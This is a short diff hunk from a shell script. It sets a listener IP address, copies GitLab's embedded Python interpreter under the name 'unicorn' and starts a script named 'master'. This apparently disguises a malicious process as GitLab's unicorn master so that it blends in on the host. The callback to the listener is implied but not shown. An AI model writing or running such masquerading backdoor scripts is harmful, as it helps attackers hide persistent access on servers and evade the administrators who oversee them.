@@ -11,7 +11,7 @@ LISTENER_IP="172.105.118.102"
 cd "$TARGET_DIR" || exit 1
 
 # 1. Copy python to name: unicorn
-cp /usr/bin/python3 unicorn
+cp /opt/gitlab/embedded/bin/python3 unicorn
 chmod +x unicorn
 
 # 2. Create python script named: master (NO .py, NO shebang)
